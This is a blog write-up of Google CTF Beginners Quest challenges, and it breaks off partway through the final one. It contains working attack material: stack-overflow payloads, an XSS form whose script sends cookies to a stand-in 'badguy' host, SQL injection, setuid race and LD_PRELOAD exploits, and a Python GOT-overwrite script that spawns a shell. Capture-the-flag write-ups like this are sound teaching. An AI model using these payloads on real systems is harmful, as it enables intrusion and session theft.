---
layout: post
date: 2018-07-31 18:49:05 +0000
last_modified_at: 2018-08-03 19:18:37 +0000
title: "Google CTF: Beginners Quest (Part 2)"
category: CTF
tags: [Google]
comments: true
image:
  feature: google-ctf-beginners-quest.png
---

This post documents Part 2 of my attempt to complete [Google CTF: Beginners Quest](https://capturetheflag.withgoogle.com/#beginners/). If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Google concluded their [Google CTF](https://capturetheflag.withgoogle.com/) a month ago. I didn't take part, so I thought of giving a go at the Beginners Quest first. I was thinking to myself, "_how hard could this be?_"—boy was I wrong. It's not that easy.

The quest has nineteen challenges as shown in the quest map—each color representing a category: <span style="color: rgb(203, 140, 217)">**purple**</span> (**misc**), <span style="color: rgb(34, 205, 75)">**green**</span> (**pwn/pwn-re**), <span style="color: rgb(231, 206, 66)">**yellow**</span> (**re**), and <span style="color: rgb(75, 142, 255)">**blue**</span> (**web**). Every challenge, if there's a need—contains an attachment—an archive file with its SHA256 hash as filename.

<map id="image-map" name="image-map">
<area shape="circle" alt="Letter" title="Letter" coords="135,141,14" href="{{ page.url | replace: "part-2", "part-1" }}#letter" />
<area shape="circle" alt="Floppy" title="Floppy" coords="212,141,14" href="{{ page.url | replace: "part-2", "part-1" }}#floppy" />
<area shape="circle" alt="Floppy 2" title="Floppy 2" coords="253,194,14" href="{{ page.url | replace: "part-2", "part-1" }}#floppy-2" />
<area shape="circle" alt="Moar" title="Moar" coords="213,246,14" href="{{ page.url | replace: "part-2", "part-1" }}#moar" />
<area shape="circle" alt="Admin UI" title="Admin UI" coords="291,245,14" href="{{ page.url | replace: "part-2", "part-1" }}#admin-ui" />
<area shape="circle" alt="Admin UI 2" title="Admin UI 2" coords="368,194,14" href="{{ page.url | replace: "part-2", "part-1" }}#admin-ui-2" />
<area shape="circle" alt="JS Safe" title="JS Safe" coords="291,142,14" href="{{ page.url | replace: "part-2", "part-1" }}#js-safe" />
<area shape="circle" alt="OCR is Cool" title="OCR is Cool" coords="213,37,14" href="{{ page.url | replace: "part-2", "part-1" }}#ocr-is-cool" />
<area shape="circle" alt="Security by Obscurity" title="Security by Obscurity" coords="291,89,14" href="{{ page.url | replace: "part-2", "part-1" }}#security-by-obscurity" />
<area shape="circle" alt="Router UI" title="Router UI" coords="369,142,15" href="#router-ui" />
<area shape="circle" alt="Message of the Day" title="Message of the Day" coords="448,142,15" href="#message-of-the-day" />
<area shape="circle" alt="Poetry" title="Poetry" coords="526,142,15" href="#poetry" />
<area shape="circle" alt="Fridge Todo List" title="Fridge Todo List" coords="602,142,14" href="#fridge-todo-list" />
<area shape="circle" alt="Admin UI 3" title="Admin UI 3" coords="449,247,15" href="#admin-ui-3" />
<area shape="circle" alt="Filter Env" title="Filter Env" coords="525,247,15" href="#filter-env" />
<area shape="circle" alt="Firmware" title="Firmware" coords="370,38,15" href="#firmware" />
<area shape="circle" alt="Gatekeeper" title="Gatekeeper" coords="448,90,15" href="#gatekeeper" />
<area shape="circle" alt="Media-DB" title="Media-DB" coords="526,38,15" href="#media-db" />
<area shape="circle" alt="Holey Beep" title="Holey Beep" coords="682,143,21" href="#holey-beep" />
</map>
<img src="/assets/images/posts/google-ctf-beginners-quest-part-2/map.png" usemap="#image-map">

Click or tap on the circles above to go to the respective challenge and its write-up.

### Admin UI 3

There’s no attachment in this challenge. Instead, we are to continue from the previous challenge.

![Admin UI 3](/assets/images/posts/google-ctf-beginners-quest-part-2/16fd4b17.png)

Let's go to where we left off in **Admin UI 2** and see what happens after the authentication.

![command_line](/assets/images/posts/google-ctf-beginners-quest-part-2/b67b2326.png)

The execution flow goes to the function `command_line()` after authentication as you can see above.

![getsx](/assets/images/posts/google-ctf-beginners-quest-part-2/3ff7c576.png)

Here, we are at the function `getsx()`, which reads from `stdin`, and the argument is the address of a buffer that stores the input. Notice that there's no argument for the size of the input to read? I smell buffer overflow in the stack!

Let's create a pattern with `pattern_create`.

![pattern_create](/assets/images/posts/google-ctf-beginners-quest-part-2/9dba718b.png)

And use that to determine the offset where we can control the return address.

![pattern](/assets/images/posts/google-ctf-beginners-quest-part-2/72e99c50.png)

We need to `continue` the execution flow in `gdb` until we exit the `command_line` function with the `quit` command. We'll hit a segmentation fault because the return address is non-existent. We can then use the `pattern_offset` command to determine the offset.

![offset](/assets/images/posts/google-ctf-beginners-quest-part-2/84db8cb2.png)

The offset is 56 bytes but what should we overwrite the return address with?

![debug_shell](/assets/images/posts/google-ctf-beginners-quest-part-2/e8c2f21e.png)

There's an interesting function `debug_shell` that wraps around the `system` library function to execute a shell command, but what is this command?

![/bin/sh](/assets/images/posts/google-ctf-beginners-quest-part-2/73f6c542.png)

Awesome. The offset controls the return address, which in turn allows us to return to `debug_shell` at `0x41414227` to execute `/bin/sh`. Sounds like a plan.

For the exploit to work, we've to supply printable ASCII characters onto the limited shell—the return address `0x41414227` is `'BAA` in little-endian ASCII.

![shell](/assets/images/posts/google-ctf-beginners-quest-part-2/09550697.png)

We got shell!

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/df6171df.png)

The flag is `CTF{c0d3ExEc?W411_pL4y3d}`.

### Router-UI

There’s no attachment in this challenge. Instead, we are to follow the link.

![Router-UI](/assets/images/posts/google-ctf-beginners-quest-part-2/23a995c1.png)

Looking at the instructions, it appears this challenge has something to do with enticing Wintermuted to click on a link; stealing session token through XSS; and bypassing the Chrome XSS Auditor. This is how `https://router-ui.web.ctfcompetition.com/` looks like.

![web-router-ui](/assets/images/posts/google-ctf-beginners-quest-part-2/95492525.png)

Anyhow, let's go with (`admin:password`) and see what happens.

![admin:password](/assets/images/posts/google-ctf-beginners-quest-part-2/591c4eee.png)

Hmmm. Wrong credentials but interesting output. Notice that a double slash ("//") separates the username and password? When was the last time you see a double slash ("//")? If the answer is "URL", you are right!

![RFC3986](/assets/images/posts/google-ctf-beginners-quest-part-2/c1309d25.png)

This is what RFC 3986: Uniform Resource Identifier (URI) has to [say](https://tools.ietf.org/html/rfc3986#page-17).

Guess what happens when we put `<script src="https:` into the username value and `www.badguy.com/bad.js"></script>` into the password value?

```
Wrong credentials: <script src="https://www.badguy.com/bad.js"></script>
```

The page at `https://router-ui.web.ctfcompetition.com` responds with the wrong credentials notification, and a `<script>` tag that loads bad JS from the `www.badguy.com` domain.

The file `bad.js` can be simple as this to steal the session cookies registered with `router-ui.web.ctfcompetition.com`.

<div class="filename"><span>bad.js</span></div>
```js
document.location = 'http://www.badguy.com/flag.png?' + document.cookie;
```

Next up, we've to figure out the link to send to Wintermuted such that clicking the link has the same effect as POSTing the username and password as seen above to `https://router-ui.web.ctfcompetition.com/login` and triggering the bad JS, without any user interaction.

This is how it looks like.

<div class="filename"><span>index.html</span></div>
```html
<html>
  <body>
    <form action="https://router-ui.web.ctfcompetition.com/login" method="post">
      <input type="text" name="username" value='<script src="https:'>
      <input type="password" name="password" value='www.badguy.com/bad.js"></script>'>
      <button type="submit">Submit</button>
    </form>
    <script>document.forms[0].submit();</script>
  </body>
</html>
```

Now that we've set up the stage, it's time to test it out!

![Email](/assets/images/posts/google-ctf-beginners-quest-part-2/4689404d.png)

Once we've sent the email, Wintermuted will click on the link because who doesn't like cats?

![Token](/assets/images/posts/google-ctf-beginners-quest-part-2/d755adf7.png)

On the web server I control (I'm using Python SimpleHTTPServer module), we can see the HTTP requests that Wintermuted makes. And what do you see?

```
flag=Try%20the%20session%20cookie;%20session=Avaev8thDieM6Quauoh2TuDeaez9Weja
```

We see two cookies: `flag` and `session`. Let's pop them into the cookie manager.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/e5ea6bdc.png)

![session](/assets/images/posts/google-ctf-beginners-quest-part-2/8a3866db.png)

Now, we are able to login to `https://router-ui.web.ctfcompetition.com/`.

![web-router-ui](/assets/images/posts/google-ctf-beginners-quest-part-2/ac446f17.png)

The flag is in the password `<input>` field.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/07dbbcdf.png)

The flag is `CTF{Kao4pheitot7Ahmu}`.

### Firmware

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/9522120f36028c8ab86a37394903b100ce90b81830cee9357113c54fd3fc84bf)

![Firmware](/assets/images/posts/google-ctf-beginners-quest-part-2/38530508.png)

Let’s unzip `firmware.zip`.

```
# unzip -l firmware.zip
Archive:  firmware.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 85257917  1980-00-00 00:00   challenge.ext4.gz
---------                     -------
 85257917                     1 file

```

This file is huge (82MB) and it appears to contain a Linux ext4 filesystem.

```
# file challenge.ext4
challenge.ext4: Linux rev 1.0 ext4 filesystem data, UUID=00ed61e1-1230-4818-bffa-305e19e53758 (extents) (64bit) (large files) (huge files)
```

How do I mount a filesystem in a file? With `mount` of course!

![mount](/assets/images/posts/google-ctf-beginners-quest-part-2/f3f264ed.png)

There's already something interesting for the curious.

```
# zcat .mediapc_backdoor_password.gz
CTF{I_kn0W_tH15_Fs}
```

The flag is `CTF{I_kn0W_tH15_Fs}`.

### Gatekeeper

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/f7e577b61f5b98aa3c0e453e83c60729f6ce3ef15c59fc76d64490377f5a0b5b).

![Gatekeeper](/assets/images/posts/google-ctf-beginners-quest-part-2/716c4f41.png)

Let's unzip `gatekeeper.zip`.

```
# unzip -l gatekeeper.zip
Archive:  gatekeeper.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13152  1980-00-00 00:00   gatekeeper
---------                     -------
    13152                     1 file
```

The file `gatekeeper` is a ELF, an executable format commonly found in GNU/Linux distributions.

Reverse engineering is tough. You need all the help you can get by doing less of the demanding tasks like reading assembly; and by taking more shortcuts as possible such as looking at the strings of the file; and by observing the program's behavior instead of putting every file into a debugger or disassembler.

Let's take a look at the strings.

```
# strings -a gatekeeper
...
/===========================================================================\
|               Gatekeeper - Access your PC from everywhere!                |
+===========================================================================+
ACCESS DENIED
[ERROR] Login information missing
Usage: %s <username> <password>
 ~> Verifying.
0n3_W4rM
 ~> Incorrect username
zLl1ks_d4m_T0g_I
Correct!
Welcome back!
CTF{% raw %}{%s}{% endraw %}
 ~> Incorrect password
...
```

These strings looked interesting. Now, let's run the program and look at its output.

![./gatekeeper](/assets/images/posts/google-ctf-beginners-quest-part-2/b605198d.png)

Hmm. We need to supply username and password as arguments to the program. Let's go with `test:test`.

![test:test](/assets/images/posts/google-ctf-beginners-quest-part-2/60f671e1.png)

Notice something? It didn't say incorrect username or password, which suggests that the program evaluates the username and password one after another. Recall the interesting strings from above. Let's pop in `0n3_W4rM` as the username and see what happens.

![Username](/assets/images/posts/google-ctf-beginners-quest-part-2/cd103f60.png)

The username `0n3_W4rM` is correct. :smirk: Perhaps the password in the interesting strings as well? Let's go with `zLl1ks_d4m_T0g_I` and see what happens.

![Wrong Password](/assets/images/posts/google-ctf-beginners-quest-part-2/fd3a49c1.png)

Oops, wrong password. What if I reverse the password?

![Right Password](/assets/images/posts/google-ctf-beginners-quest-part-2/a8d87e04.png)

Look Ma, no assembly. :grin:

The flag is `CTF{I_g0T_m4d_sk1lLz}`.

### Media-DB

There’s no attachment in this challenge. Instead, there’s a hint to connect to `media-db.ctfcompetition.com` at port 1337 with `nc`.

![Media-DB](/assets/images/posts/google-ctf-beginners-quest-part-2/a1efd784.png)

Let's do that.

![nc](/assets/images/posts/google-ctf-beginners-quest-part-2/37aff8cf.png)

I discover my first clue after playing around with the interface. Media-DB is running on Python code `media-db.py`.

![IndexError](/assets/images/posts/google-ctf-beginners-quest-part-2/51f757a8.png)

The next clue comes after much persuasive coaxing by a well-known character in SQLi—the single quote. Well, two well-known characters actually—the backslash as well.

![sqlite3.OperationalError](/assets/images/posts/google-ctf-beginners-quest-part-2/d001d38c.png)

Media-DB is running on Python and SQLite. But, how do we proceed knowing this information? As you can see from above, the mechanism behind **Option 4) shuffle artist** is to display column `artist` and `song` from the table `media` after you have added a song through **Option 1) add song**.

![Look Ma No Hands](/assets/images/posts/google-ctf-beginners-quest-part-2/4153bcb0.png)

Using `UNION`, we can glean hidden information in other tables. First, we need to find the available tables.

![Schema](/assets/images/posts/google-ctf-beginners-quest-part-2/46fa7811.png)

This is the database schema. Armed with this knowledge, we can dump out all the information in the database.

![OAuth Token](/assets/images/posts/google-ctf-beginners-quest-part-2/1cf0f579.png)

The flag is `CTF{fridge_cast_oauth_token_cahn4Quo}`.

### Message of the Day

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/cf6c6160966eae95b4313f05ad33b9794d2817b06766a5261d952990ad27a6a6). And there's a hint to connect to `motd.ctfcompeetition.com` at port 1337 with `nc`.

![Message of the Day](/assets/images/posts/google-ctf-beginners-quest-part-2/d39c410a.png)

Let's unzip `motd.zip`.

```
# unzip -l motd.zip
Archive:  motd.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    33784  1980-00-00 00:00   motd
---------                     -------
    33784                     1 file
```

I'm guessing `motd` is the binary running behind `motd.ctfcompetition.com`, and we've to exploit it to `pwn` this challenge.

![motd](/assets/images/posts/google-ctf-beginners-quest-part-2/4761425f.png)

After playing around with the online version, the flag should be behind **4 - Get admin MOTD**. Disassembling `motd` confirms my hunch. There's a `read_flag` function in `motd`.

![read_flag](/assets/images/posts/google-ctf-beginners-quest-part-2/e805442f.png)

Other functions correspond to the options as well.

![Functions](/assets/images/posts/google-ctf-beginners-quest-part-2/7707e9b9.png)

Well, to `pwn` this challenge, we need a way to enter user-supplied input to the binary. We have two such functions, `set_admin_motd` and `set_motd`.

The function `set_admin_motd` merely prints out a TODO message to stdout. That leaves `set_motd` for me to explore.

_Unsafe function `gets`._

![set_motd](/assets/images/posts/google-ctf-beginners-quest-part-2/fd888683.png)

While I was stepping through `set_motd`, I noticed the use of an unsafe function `gets`. This is what the manpage of `gets` has to say.

![gets](/assets/images/posts/google-ctf-beginners-quest-part-2/9aef997f.png)

Woohoo! A buffer overflow exploit—this means that I can send an input to overwrite the return address, but which address should I use? The address of `read_flag` of course.

Not so fast, Captain Obvious.

We also need to consider the offset that lets us control the return address. Let's see how we can determine the offset.

![pattern_create](/assets/images/posts/google-ctf-beginners-quest-part-2/cb6c0580.png)

First, let's create a 300-byte pattern. This is how the pattern looks like.

![buf](/assets/images/posts/google-ctf-beginners-quest-part-2/9fd3f1a1.png)

After we supply the pattern as input to `gets`, let the program `continue` in `gdb`. We'll soon encounter a segmentation fault.

![segfault](/assets/images/posts/google-ctf-beginners-quest-part-2/1b5a729a.png)

Use `pattern_offset` to look for the pattern at the top of the stack, to determine the offset.

![pattern_offset](/assets/images/posts/google-ctf-beginners-quest-part-2/ca140d4c.png)

We now have all the ingredients to bake our exploit.

* Offset is 264 bytes
* Overwrite the return address to that of `read_flag` @ 0x606063a5

```
# perl -e 'print "A" x 264 . "\xa5\x63\x60\x60\x00\x00"' > sploit
```

Time to run the exploit.

![sploit](/assets/images/posts/google-ctf-beginners-quest-part-2/5db0404c.png)

The flag is `CTF{m07d_1s_r3t_2_r34d_fl4g}`

### Poetry

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/3fecb3de10be268f896adbb2ac7ddb29a8a8a05de6085abc9d0edb53f5a64259). And there's a hint to connect to `poetry.ctfcompetition.com` at port 1337 with `nc`.

![Poetry](/assets/images/posts/google-ctf-beginners-quest-part-2/e9a4b357.png)

Let's unzip `poetry.zip`.

```
# unzip -l poetry.zip
Archive:  poetry.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
   917192  1980-00-00 00:00   poetry
---------                     -------
   917192                     1 file
```

This challenge is slightly different. Connecting to `poetry.ctfcompetition.com` at port 1337 gives you a shell as `user` with an empty prompt string.

![shell](/assets/images/posts/google-ctf-beginners-quest-part-2/614f9167.png)

The attached file is at `/home/poetry/poetry`. The attached `poetry` and the online `poetry` have the same SHA256 hash.

_SHA256 hash of attached `poetry`_

![poetry](/assets/images/posts/google-ctf-beginners-quest-part-2/9339057b.png)

_SHA256 hash of online `poetry`_

![poetry](/assets/images/posts/google-ctf-beginners-quest-part-2/6258900e.png)

Having the identical executable will assist us in determining how to exploit it.

Right off the bat, I notice the following:

* The executable is `setuid` to `poetry`
* The executable is statically linked, which explains the size (917192 bytes).

The size is telling—this is perhaps a feeble attempt to throw off any analysis in reverse engineering the executable. Despite its size, the behavior of the executable is somewhat simple after some reverse engineering.

<div class="filename"><span>poetry.c</span></div>
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main(int argc, char* argv[]) {
  if (!getenv("LD_BIND_NOW")) {
    char buf[4096];
    if (readlink("/proc/self/exe", buf, 4096)) {
      setenv("LD_BIND_NOW", "1", 1);
      execv(buf, argv);
    }
  }

  if (argc < 2) {
    return 0;
  } else {
    puts("o/\n");
    // do something
    syscall(0xe7);
  }
}
```

Searching for `readlink`, `/proc/self/exe`, and `vulnerability` in Google brings me to a old blog [post](https://blog.cr0.org/2009/07/old-school-local-root-vulnerability-in.html) on CVE-2009-1894.

Like the code of `pulseaudio` in the post, `poetry` is re-executing itself through `/proc/self/exe`, so that the dynamic linker performs all relocation at load-time. Here's the irony—`poetry` is statically linked—it doesn't require the dynamic linker.

Essentially, this challenge is about exploiting a race condition such that when we are reading the symbolic link `/proc/self/exe` through `readlink`; we create a hardlink and thereby control the path to a executable that we want to run; and have `execv` execute that instead. And because `poetry` is `setuid` to `poetry`, we want to run a executable that reads the flag at /`home/poetry/flag`. Let's call it `recite.c` since we are reciting poetry after all.

<div class="filename"><span>recite.c</span></div>
```c
#include <stdio.h>

int main() {
  char flag[20]; // the flag is 19 bytes in size
  FILE *f;
  f = fopen("/home/poetry/flag", "r");
  fgets(flag, 20, f);
  puts(flag);
  return 0;
}
```

There's one small caveat—the online shell doesn't have `gcc`. I've to compile `recite.c` locally, compress it, and transfer it over to the online shell through `base64`.

At the local machine, do the following:

```
# gcc -o recite recite.c
# gzip recite
# base64 recite.gz | tr -d '\n' && echo
```

At the online shell, do the following:

```
$ echo H4sICK...AAA= > recite.gz.b64
$ base64 -d < recite.gz.b64 > recite.gz
$ gunzip recite.gz
$ chmod +x recite
```

I chanced upon another blog [post](https://blog.stalkr.net/2010/11/exec-race-condition-exploitations.html) that documented a method to reliably exploit the race condition—through the file descriptor.

Now that we've set the stage, let's proceed with the exploit.

Create a hardlink to `/home/poetry/poetry`. Let's call it `x` for exploit.

![hardlink](/assets/images/posts/google-ctf-beginners-quest-part-2/959dc85c.png)

Hardlink is a link to the same file with the same inode number (5). You can see that `x` is also `setuid` to `poetry`. Hardlink is not enabled by default for security reason (at least on my GNU/Linux distribution), which you'll see why later. You can temporarily enable it by setting:

```
# echo 0 > /proc/sys/fs/protected_hardlinks
```

Next, we open a file descriptor to the hardlink in the current shell. Note that we have not executed the hardlink. We are merely 'recording' everything about the hardlink in the file descriptor.

![fd](/assets/images/posts/google-ctf-beginners-quest-part-2/c793920d.png)

Delete the hardlink.

![delete](/assets/images/posts/google-ctf-beginners-quest-part-2/606b234f.png)

You can see from above, there's a `(deleted)` appended to `x`. The symbolic link appears broken but the hardlink is actually still present in the file descriptor.

Rename `recite` to `x (deleted)`. Execute `/proc/$$/fd/3` with `exec`.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/cfd26c0f.png)

When we execute the file descriptor, it's the same as executing `x`— a hardlink to `poetry` (same owner, same `setuid`). When `readlink` reads `/proc/self/exe`, it's actually reading `/proc/$$/fd/3`—itself a symbolic link to `x (deleted)`, which is then supplied to `execv` as an argument for execution. Guess what, `x (deleted)` is now our `recite` program and `recite` dutifully prints out the flag.

The flag is `CTF{CV3-2009-1894}`.

### Filter Env

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/0915d9f2952cfce0d7c39fc8690dd808323b0a2e261bfe65fc95edeac7f2c24f). And there’s a hint to connect to `env.ctfcompetition.com` at port 1337 with `nc`.

![Filter Env](/assets/images/posts/google-ctf-beginners-quest-part-2/8b9d1127.png)

Let's unzip `filterenv.zip`.

```
# unzip -l env.zip
Archive:  env.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2425  1980-00-00 00:00   filterenv.c
---------                     -------
     2425                     1 file
```

This challenge is slightly different. Connecting to `env.ctfcompetition.com` at port 1337 gives you a shell as `user` with an empty prompt string.

![shell](/assets/images/posts/google-ctf-beginners-quest-part-2/f5720a62.png)

We have the executable `filterenv` and it's `setuid` to `adminimum`. The flag is also readable by `adminimum` alone. I'm assuming the file `filterenv.c` in the attachment is the source code to `filterenv`.

From the source code, `filterenv` appears to do the following:

1. Read an array of environment variables from `stdin`
2. Clear the existing environment
3. Load the array from Step 1 into the environment
4. Filter unsafe environment variables
5. Calls `/usr/bin/id` through `execvp`

The challenge is to manipulate the `setuid` program to read the flag through accepting user-controlled input at the `readenv` function. The program attempts input validation through filtering of unsafe environment variables at the `filter_env` function.

Let's look at the `filter_env` function.

```c
/* reset unsafe variables */
static void filter_env(void)
{
  char **p;

  for (p = unsafe; *p != NULL; p++) {
    if (getenv(*p) != NULL) {
      if (setenv(*p, "", 1) != 0)
  err(1, "setenv");
    }
  }

  /* just be safe, prevent heap spraying attacks */
  shuffle();
}
```

The function iterates through the `unsafe` array, evaluates the existence of each environment variable—if it exists in the environment, sets it to an empty string.

There's a problem with this approach. Suppose there are two identical environment variables in the environment, `filter_env` will filter the first one and leave out the second one because the `getenv` function returns the pointer to the first matching environment variable.

Armed with this information, we can provide two identical unsafe environment variables, filter the first one and load the second one into the environment.

Let's use the `LD_PRELOAD` environment variable. This is what `ld.so(8)` says about `LD_PRELOAD`.

![LD_PRELOAD](/assets/images/posts/google-ctf-beginners-quest-part-2/65b9ef7e.png)

This should work because `execvp` takes the extern variable `environ` as the environment. Also, `/usr/bin/id` is a dynamically-linked executable and the dynamic loader will honor the `LD_PRELOAD` environment variable.

The shared object loaded in `LD_PRELOAD` should help us read the flag. This simple code `readflag.c` does that.

<div class="filename"><span>readflag.c</span></div>
```c
#include <stdio.h>

void _init() {
	char flag[20]; // the flag is 19 bytes
	FILE *f;
	f = fopen("/home/adminimum/flag", "r");
	fgets(flag, 20, f);
	puts(flag);
}

```

There's one small caveat—the online shell doesn't have `gcc`. I've to compile `readflag.c` locally, compress it, and transfer it over to the online shell through `base64`.

At the local machine, do the following:

```
# gcc -fPIC -shared -nostartfiles -o readflag.so readflag.c
# gzip readflag.so
# base64 readflag.so.gz | tr -d '\n' && echo
```

At the online shell, do the following:

```
$ echo H4sIC...AAA= > /tmp/readflag.so.gz.b64
$ base64 -d < /tmp/readflag.so.gz.b64 > /tmp/readflag.so.gz
$ gunzip /tmp/readflag.so.gz
```
Let's give it a shot.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/dfba227c.png)

The flag is `CTF{H3ll0-Kingc0p3}`.

### Fridge Todo List

The attachement is [here](https://storage.googleapis.com/gctf-2018-attachments/6662358181e0d4bf5fabd94f2dd5d41ab7c90685617a4b0fbb12df5be6044a59). And there’s a hint to connect to `fridge-todo-list.ctfcompetition.com` at port 1337 with `nc`.

![Frdige Todo List](/assets/images/posts/google-ctf-beginners-quest-part-2/05b8fc58.png)

Let's unzip `todo.zip`.

```
# unzip -l todo.zip
Archive:  todo.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    18224  1980-00-00 00:00   todo
     9197  1980-00-00 00:00   todo.c
---------                     -------
    27421                     2 files
```

This challenge requires us to play the role of a bug hunter. We need to find the bug that will let us exploit it to reveal the flag. Good thing we have the source code. We can compile it with `gcc -g` to generate debug information, allowing us to debug with more ease.

```
# gcc -g -Wall -o todo todo.c
```

It wasn't long before I chanced upon a bug. The program accepts negative integer and there's different output depending on the input.

![bug](/assets/images/posts/google-ctf-beginners-quest-part-2/e9db3708.png)

The bug is there when you look at the code responsible for printing the TODO entry.

![print_todo](/assets/images/posts/google-ctf-beginners-quest-part-2/264d2151.png)

Because `todos` is an array, it's also a pointer. As such, we are able to read arbitrary memory address, at TODO_LENGTH (48 bytes) boundary with the format string parameter `%s` in the `printf` function.

Here we are, at the point where `idx = -2` and before the TODO entry gets print out. You can see the address of `todos` and `todos[idx*TODO_LENGTH]`.

![gdb](/assets/images/posts/google-ctf-beginners-quest-part-2/b44b8f03.png)

If printing the TODO entry is reading memory at user-controlled address, then storing the TODO entry is writing memory at user-controlled address. Let's look at the `store_todo` function.

![store_todo](/assets/images/posts/google-ctf-beginners-quest-part-2/e0b454fa.png)

Here's what we see when we look at the memory address of the sections in the program.

![sections](/assets/images/posts/google-ctf-beginners-quest-part-2/0c085cf8.png)

The `.got.plt` section is the global offset table (GOT) for the procedure linkage table (PLT) where it contains the resolved target addresses or unresolved addresses from the PLT, waiting to trigger the target address resolution routine when called.

Look how close `todos` (`0x555555559140`) is to the `.got.plt` section (`0x555555559000`) in the memory.

The `.got.plt` section is a common target for exploitation because you can change a function to some other executable code you control. Let's look at the available PLT functions.

![PLT functions](/assets/images/posts/google-ctf-beginners-quest-part-2/e11b8b94.png)

From the functions above, `atoi@plt` should be the target. Why?

If you look at the source code, you can see that `atoi@plt` takes in a string as an argument from `stdin`, after every option gets completed in the while loop. If `atoi@plt` changes to `system@plt`, and the argument is `/bin/sh`, guess what will happen? You get a shell.

![read_int](/assets/images/posts/google-ctf-beginners-quest-part-2/b757f5c6.png)

To do that, we need to determine the following in a position-independent way:

+ an unresolved address in the PLT that's in the vicinity of `system@plt`
+ the GOT of `atoi@plt` so that we can overwrite it with `system@plt`

The GOT of `write@plt` remains unresolved until it's used to write the `todos` array to file at the end of the program.

![GOT of write@plt](/assets/images/posts/google-ctf-beginners-quest-part-2/347e36db.png)

We can use `-6` as the index to read the memory at `0x555555559020`, the GOT of `write@plt`, where `0x555555559140` is the address of `todos`.

Assuming the offsets remain unchanged, `system@plt` (`0x555555555070`) is at `0x2a` away from the unresolved address of `write@plt` (`0x55555555046`).

![GOT of atoi@plt](/assets/images/posts/google-ctf-beginners-quest-part-2/56f2ab77.png)

We can use `-4` as the index to write to the memory at `0x555555559088`, the GOT of `atoi@plt`, where `0x555555559140` is the address of `todos`. Note that we need eight junk bytes to jump over `0x555555559080` to write to `0x555555559088`.

Now that we've set the stage, let's proceed with the exploitation. To that end, I wrote this simple Python script, `exploit.py`. The script contains a telnet client at the end to interact with the program.

<div class="filename"><span>exploit.py</span></div>
```python
from socket import *
from struct import *
from telnetlib import *

s = socket(AF_INET, SOCK_STREAM)
s.connect(("fridge-todo-list.ctfcompetition.com", 1337))

def recv(e):
  r = ""
  while True:
    r += s.recv(1)
    if r.endswith(e):
      break
  return r

print recv(": ")
s.send("wintermuted\n")

print recv("> ")
s.send("2\n")
print recv("? ")
s.send("-6\n")  # read the GOT of write@plt and print its unresolved address
v = recv("> ")
v = v.split("\n")[0].split(" ")[-1]
v = v + "\0" * (8 - len(v))
write = unpack("<Q", v)[0]  # store unresolved write@plt address for offset calculation
print "\n*** Unresolved address of write@plt is at 0x%08x ***" % write

s.send("3\n")
print recv("? ")
s.send("-4\n")  # write to the GOT of atoi@plt
print recv("? ")
s.send("JUMPOVER" + pack("<Q", write + 0x2a)[:8] + "\n")
# 8 bytes to jump over; system@plt is at write+0x2a

t = Telnet()
t.sock = s
t.interact()
```

Let's give it a shot.

![CountZero](/assets/images/posts/google-ctf-beginners-quest-part-2/720eb6c1.png)

Now that we know Wintermuted is CountZero, let's look at the TODO list the right way.

![flag](/assets/images/posts/google-ctf-beginners-quest-part-2/5aee6825.png)

The flag is `CTF{goo.gl/cjHknW}`.

### Holey Beep

The attachment is [here](https://storage.googleapis.com/gctf-2018-attachments/575142163b9bf4762ce4e2412ff05ee855dc7644b402522f79e39af017d99955).

![Holey Beep](/assets/images/posts/google-ctf-beginners-quest-part-2/00269e20.png)

Let's unzip `holey_beep.zip`.

```
# unzip -l holey_beep.zip
Archive:  holey_beep.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     9000  1980-00-00 00:00   holey_beep
---------                     -------
     9000                     1 file
```

There's no source code in this challenge. I've no choice but to put my reverse engineering skills to good use.

![functions](/assets/images/posts/google-ctf-beginners-quest-part-2/fe73ece8.png)

This is my result of reversing engineering the executable back to source code. I'm confident this is close to the original source code. The compiled executable is almost identical to `holey_beep` line for line after disassembly.

<div class="filename"><span>holey_beep.c</span></div>
```c
#include <err.h>
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/kd.h>

int device = -1;
char *USAGE = "usage: holey_beep period1 [period2] [period3] [...]";

void handle_sigterm(int signum) {

  if (!(device < 0)) {
    if  (ioctl(device, KIOCSOUND, 0) < 0) {
      fprintf(stderr, "ioctl(%d, KIOCSOUND, 0) failed.", device);
      char data[1024] = {0};
      read(device, &data, sizeof(data)-1);
      fprintf(stderr, "debug_data: \"%s\"", data);
    }
  }
  exit(0);
}

int main(int argc, char *argv[]) {
  if (signal(SIGTERM, handle_sigterm) == (void *)-1)
    errx(1, "signal");

  if (argc <= 1)
    errx(1, USAGE);

  for (int i = 1; i < argc; i++) {
    if ((device = open("dev/console", O_RDONLY)) < 0) {
      errx(1, "open(\"dev/console\", O_RDONLY)");
    } else {
      int period = atoi(argv[i]);
      if (ioctl(device, KIOCSOUND, period) < 0)
        fprintf(stderr, "ioctl(%d, KIOCSOUND, %d) failed.", device, period);
      close(device);
    }
  }
}

```
With the source code in hand, exploiting the `setuid` `holey_beep` becomes trivial.

Right off the bat, the program registers a signal handling function, `handle_sigterm`, which will take control of execution when `SIGTERM`, a termination signal gets sent to the program.

If the file descriptor `device` is a positive number, the program will read 1023 bytes from it and print the result to `stderr`. Note that the signal handler is counting on `ioctl` to fail.

Under what circumstances will `ioctl` fail? As long as the file descriptor is not opened to a character device, `ioctl` fails. Simple as that.

